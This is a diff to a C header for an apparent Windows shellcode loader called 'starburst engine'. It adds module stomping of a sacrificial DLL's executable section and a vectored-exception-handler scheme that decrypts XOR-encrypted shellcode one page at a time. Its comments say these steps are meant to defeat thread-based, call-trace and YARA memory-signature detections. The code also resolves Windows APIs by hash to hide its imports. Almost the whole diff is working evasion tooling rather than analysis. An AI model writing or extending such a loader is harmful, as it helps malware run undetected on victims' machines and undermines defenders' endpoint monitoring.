@@ -12,6 +12,7 @@
  *   ALLOC_VIRTUALALLOC        - VirtualAlloc / VirtualAllocEx
  *   ALLOC_NTALLOCATE          - NtAllocateVirtualMemory (syscall-level)
  *   ALLOC_MAPVIEW             - NtCreateSection + NtMapViewOfSection
+ *   ALLOC_MODULESTOMP         - LoadLibraryExW sacrificial DLL, stomp .text section
  *
  * Execution methods (local):
  *   EXEC_DIRECT               - Cast to function pointer, call
@@ -19,6 +20,7 @@
  *   EXEC_CALLBACK             - EnumWindows callback
  *   EXEC_FIBER                - ConvertThreadToFiber + CreateFiber
  *   EXEC_THREADPOOL           - TpAllocWork + TpPostWork
+ *   EXEC_GUARDPAGE            - VEH guard-page streaming (only ~3 pages cleartext at a time)
  *
  * Injection modes (remote - requires INJECT_REMOTE + target process):
  *   INJECT_REMOTE             - Write into remote process, execute via remote thread
@@ -56,6 +58,12 @@
 #define H_GetThreadContext          0x85cca27eu
 #define H_SetThreadContext          0x6ed04712u
 #define H_QueueUserAPC              0x890bb4fbu
+#define H_LoadLibraryExW            0x1cd12702u
+#define H_AddVectoredExceptionHandler 0xafac650du
+#define H_FlushInstructionCache     0x0490286bu
+#define H_VirtualProtect            0x820621f3u
+#define H_VirtualFree               0x3a9acc72u
+#define H_RtlAddFunctionTable       0x38791528u
 
 #define H_MOD_NTDLL                 0xa62a3b3bu
 #define H_MOD_KERNEL32              0xa3e6f6c3u
@@ -106,6 +114,14 @@ typedef BOOL    (WINAPI *pTerminateProcess)(HANDLE, UINT);
 typedef BOOL    (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
 typedef BOOL    (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);
 typedef DWORD   (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
+typedef HMODULE (WINAPI *pLoadLibraryExW)(LPCWSTR, HANDLE, DWORD);
+typedef PVOID   (WINAPI *pAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
+typedef BOOL    (WINAPI *pFlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
+typedef BOOL    (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef BOOL    (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
+#ifdef _WIN64
+typedef BOOLEAN (WINAPI *pRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
+#endif
 
 /* ─── hash-based API resolution via PEB ─── */
 
@@ -191,11 +207,85 @@ static FARPROC _resolve(unsigned int mod_hash, unsigned int func_hash) {
 }
 
 /* ═══════════════════════════════════════════════════════
+ *  MODULE STOMPING (ALLOC_MODULESTOMP)
+ *  LoadLibraryExW a sacrificial DLL, stomp its .text
+ *  section. Memory is file-backed → defeats shellcode_thread
+ *  and CallTrace UNKNOWN detections.
+ * ═══════════════════════════════════════════════════════ */
+
+#if defined(ALLOC_MODULESTOMP)
+
+static HMODULE _stomp_module = NULL;
+static void   *_stomp_text_addr = NULL;
+static DWORD   _stomp_text_size = 0;
+
+static void* _modulestomp_alloc(SIZE_T size) {
+    pLoadLibraryExW pLLW = (pLoadLibraryExW)_resolve(H_MOD_KERNEL32, H_LoadLibraryExW);
+    if (!pLLW) return NULL;
+
+    WCHAR dllname[] = { 'x','p','s','s','e','r','v','i','c','e','s','.','d','l','l', 0 };
+
+    _stomp_module = pLLW(dllname, NULL, 0x00000001 /* DONT_RESOLVE_DLL_REFERENCES */);
+    if (!_stomp_module) return NULL;
+
+    char *base = (char*)_stomp_module;
+    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
+    char *nt = base + e_lfanew;
+    WORD num_sections = *(WORD*)(nt + 0x06);
+    WORD opt_hdr_size = *(WORD*)(nt + 0x14);
+    char *section = nt + 0x18 + opt_hdr_size;
+
+    for (WORD i = 0; i < num_sections; i++) {
+        DWORD chars = *(DWORD*)(section + 0x24);
+        DWORD vsize = *(DWORD*)(section + 0x08);
+        DWORD vrva  = *(DWORD*)(section + 0x0C);
+
+        int is_exec = (chars & 0x20000000) != 0; /* IMAGE_SCN_MEM_EXECUTE */
+        int is_read = (chars & 0x40000000) != 0; /* IMAGE_SCN_MEM_READ */
+        if (is_exec && is_read && vsize >= size) {
+            _stomp_text_addr = base + vrva;
+            _stomp_text_size = vsize;
+
+            pVirtualProtect pVP = (pVirtualProtect)_resolve(H_MOD_KERNEL32, H_VirtualProtect);
+            DWORD old;
+            if (pVP) pVP(_stomp_text_addr, _stomp_text_size, PAGE_READWRITE, &old);
+            return _stomp_text_addr;
+        }
+        section += 40;
+    }
+    return NULL;
+}
+
+#ifdef _WIN64
+static void _modulestomp_fixup_unwind(void) {
+    char *base = (char*)_stomp_module;
+    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
+    char *nt = base + e_lfanew;
+    DWORD exc_rva  = *(DWORD*)(nt + 0x18 + 0x70 + 8 * 3);
+    DWORD exc_size = *(DWORD*)(nt + 0x18 + 0x70 + 8 * 3 + 4);
+
+    if (exc_rva && exc_size) {
+        PRUNTIME_FUNCTION pdata = (PRUNTIME_FUNCTION)(base + exc_rva);
+        DWORD count = exc_size / sizeof(RUNTIME_FUNCTION);
+        pRtlAddFunctionTable pRtlAdd =
+            (pRtlAddFunctionTable)_resolve(H_MOD_KERNEL32, H_RtlAddFunctionTable);
+        if (pRtlAdd) pRtlAdd(pdata, count, (DWORD64)base);
+    }
+}
+#endif
+
+#endif /* ALLOC_MODULESTOMP */
+
+/* ═══════════════════════════════════════════════════════
  *  ALLOCATION
  * ═══════════════════════════════════════════════════════ */
 
 static void* engine_alloc(HANDLE hProcess, SIZE_T size) {
-#if defined(ALLOC_NTALLOCATE)
+#if defined(ALLOC_MODULESTOMP)
+    (void)hProcess;
+    return _modulestomp_alloc(size);
+
+#elif defined(ALLOC_NTALLOCATE)
     pNtAllocateVirtualMemory NtAlloc =
         (pNtAllocateVirtualMemory)_resolve(H_MOD_NTDLL, H_NtAllocateVirtualMemory);
     void *addr = NULL;
@@ -264,6 +354,157 @@ static void engine_write(HANDLE hProcess, void *dst, const void *src, SIZE_T siz
 }
 
 /* ═══════════════════════════════════════════════════════
+ *  GUARD PAGE VEH STREAMING (EXEC_GUARDPAGE)
+ *  Keeps only a sliding window of cleartext pages.
+ *  Defeats memory_signature YARA scanning.
+ * ═══════════════════════════════════════════════════════ */
+
+#if defined(EXEC_GUARDPAGE)
+
+#define GP_MAXVISIBLE  3
+#define GP_MAXREGIONS  8
+#define GP_PAGE_SIZE   0x1000
+
+typedef struct {
+    ULONG_PTR start;
+    ULONG_PTR end;
+    DWORD     perms;
+    char     *source;
+} _GuardRegion;
+
+typedef struct {
+    char *pages[GP_MAXVISIBLE];
+    int   index;
+} _RegionQueue;
+
+static _GuardRegion _gp_regions[GP_MAXREGIONS];
+static _RegionQueue _gp_state;
+static char         _gp_xorkey[16];
+
+static void _gp_memcpy(void *d, const void *s, SIZE_T n) {
+    char *dd = (char*)d;
+    const char *ss = (const char*)s;
+    for (SIZE_T i = 0; i < n; i++) dd[i] = ss[i];
+}
+
+static void _gp_memset(void *d, int v, SIZE_T n) {
+    char *dd = (char*)d;
+    for (SIZE_T i = 0; i < n; i++) dd[i] = (char)v;
+}
+
+static void _gp_xor(char *data, DWORD len) {
+    for (DWORD i = 0; i < len; i++)
+        data[i] ^= _gp_xorkey[i % 16];
+}
+
+static _GuardRegion* _gp_find_region(ULONG_PTR addr) {
+    for (int i = 0; i < GP_MAXREGIONS; i++) {
+        if (addr >= _gp_regions[i].start && addr < _gp_regions[i].end)
+            return &_gp_regions[i];
+    }
+    return NULL;
+}
+
+static LONG WINAPI _gp_veh_handler(EXCEPTION_POINTERS *ep) {
+    if (ep->ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
+        return EXCEPTION_CONTINUE_SEARCH;
+    if (ep->ExceptionRecord->NumberParameters < 2)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    ULONG_PTR fault_addr = ep->ExceptionRecord->ExceptionInformation[1];
+    ULONG_PTR page_addr  = fault_addr - (fault_addr % GP_PAGE_SIZE);
+
+    _GuardRegion *rgn = _gp_find_region(fault_addr);
+    if (!rgn)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    pVirtualProtect pVP = (pVirtualProtect)_resolve(H_MOD_KERNEL32, H_VirtualProtect);
+    pFlushInstructionCache pFIC =
+        (pFlushInstructionCache)_resolve(H_MOD_KERNEL32, H_FlushInstructionCache);
+    DWORD old;
+
+    /* evict the oldest visible page */
+    char *oldest = _gp_state.pages[_gp_state.index % GP_MAXVISIBLE];
+    if (oldest) {
+        pVP(oldest, GP_PAGE_SIZE, PAGE_READWRITE, &old);
+        _gp_memset(oldest, 0, GP_PAGE_SIZE);
+        pVP(oldest, GP_PAGE_SIZE, PAGE_READWRITE | PAGE_GUARD, &old);
+    }
+
+    /* make target page writable */
+    ULONG_PTR src_offset = page_addr - rgn->start;
+    pVP((void*)page_addr, GP_PAGE_SIZE, PAGE_READWRITE, &old);
+
+    /* stream in one page from encrypted source */
+    _gp_memcpy((void*)page_addr, rgn->source + src_offset, GP_PAGE_SIZE);
+    _gp_xor((char*)page_addr, GP_PAGE_SIZE);
+
+    /* set final permissions */
+    pVP((void*)page_addr, GP_PAGE_SIZE, rgn->perms, &old);
+    if (pFIC) pFIC((HANDLE)-1, (void*)page_addr, GP_PAGE_SIZE);
+
+    /* track this page */
+    _gp_state.pages[_gp_state.index % GP_MAXVISIBLE] = (char*)page_addr;
+    _gp_state.index = (_gp_state.index + 1) % GP_MAXVISIBLE;
+
+    return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+static int _gp_setup(void *dest, SIZE_T sc_len) {
+    pVirtualAllocEx pVA = (pVirtualAllocEx)_resolve(H_MOD_KERNEL32, H_VirtualAllocEx);
+    pVirtualProtect pVP = (pVirtualProtect)_resolve(H_MOD_KERNEL32, H_VirtualProtect);
+    pAddVectoredExceptionHandler pAVEH =
+        (pAddVectoredExceptionHandler)_resolve(H_MOD_KERNEL32, H_AddVectoredExceptionHandler);
+    if (!pVA || !pVP || !pAVEH) return 0;
+
+    /* generate XOR key from ASLR entropy */
+    ULONG_PTR seed = (ULONG_PTR)&seed ^ (ULONG_PTR)dest ^ (ULONG_PTR)_gp_veh_handler;
+    for (int i = 0; i < 16; i++) {
+        seed = seed * 6364136223846793005ULL + 1442695040888963407ULL;
+        _gp_xorkey[i] = (char)(seed >> 33);
+    }
+
+    /* init state */
+    for (int i = 0; i < GP_MAXREGIONS; i++) {
+        _gp_regions[i].start = 0;
+        _gp_regions[i].end   = 0;
+    }
+    _gp_state.index = 0;
+    for (int i = 0; i < GP_MAXVISIBLE; i++)
+        _gp_state.pages[i] = NULL;
+
+    /* pad size to page boundary */
+    SIZE_T padded = (sc_len + GP_PAGE_SIZE - 1) & ~(GP_PAGE_SIZE - 1);
+
+    /* allocate stream source and copy + encrypt */
+    char *stream_src = (char*)pVA((HANDLE)-1, NULL, padded, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!stream_src) return 0;
+
+    _gp_memcpy(stream_src, dest, sc_len);
+    if (sc_len < padded)
+        _gp_memset(stream_src + sc_len, 0, padded - sc_len);
+    _gp_xor(stream_src, (DWORD)padded);
+
+    /* register guard region */
+    _gp_regions[0].start  = (ULONG_PTR)dest;
+    _gp_regions[0].end    = (ULONG_PTR)dest + padded;
+    _gp_regions[0].perms  = PAGE_EXECUTE_READ;
+    _gp_regions[0].source = stream_src;
+
+    /* zero destination and set PAGE_GUARD on all pages */
+    DWORD old;
+    pVP(dest, padded, PAGE_READWRITE, &old);
+    _gp_memset(dest, 0, padded);
+    pVP(dest, padded, PAGE_READWRITE | PAGE_GUARD, &old);
+
+    /* install VEH */
+    pAVEH(1, _gp_veh_handler);
+    return 1;
+}
+
+#endif /* EXEC_GUARDPAGE */
+
+/* ═══════════════════════════════════════════════════════
  *  LOCAL EXECUTION
  * ═══════════════════════════════════════════════════════ */
 
@@ -317,6 +558,10 @@ static HANDLE engine_exec_local(void *addr) {
     TpRel(work);
     pSleep pSl = (pSleep)_resolve(H_MOD_KERNEL32, H_Sleep);
     if (pSl) pSl(1000);
+    return NULL;
+
+#elif defined(EXEC_GUARDPAGE)
+    ((void(*)(void*))addr)(NULL);
     return NULL;
 
 #else /* EXEC_DIRECT (default) */
@@ -481,7 +726,25 @@ static int engine_run(const unsigned char *sc, unsigned int sc_len) {
     if (!addr) return 0;
 
     engine_write(hSelf, addr, sc, sc_len);
+
+#if defined(EXEC_GUARDPAGE)
+    /* guard page streaming: encrypt source, zero dest, install VEH.
+     * The VEH will decrypt pages on-demand as code executes through them.
+     * This replaces the normal protect step — guard pages handle permissions. */
+    if (!_gp_setup(addr, sc_len)) return 0;
+
+#if defined(ALLOC_MODULESTOMP) && defined(_WIN64)
+    _modulestomp_fixup_unwind();
+#endif
+
+    ((void(*)(void*))addr)(NULL);
+    return 1;
+#else
     engine_protect(hSelf, addr, sc_len);
+
+#if defined(ALLOC_MODULESTOMP) && defined(_WIN64)
+    _modulestomp_fixup_unwind();
+#endif
 
     HANDLE hThread = engine_exec_local(addr);
     if (hThread) {
@@ -491,7 +754,8 @@ static int engine_run(const unsigned char *sc, unsigned int sc_len) {
         if (pCH) pCH(hThread);
     }
     return 1;
-#endif
+#endif /* EXEC_GUARDPAGE */
+#endif /* INJECT_* */
 }
 
 #endif /* STARBURST_ENGINE_H */
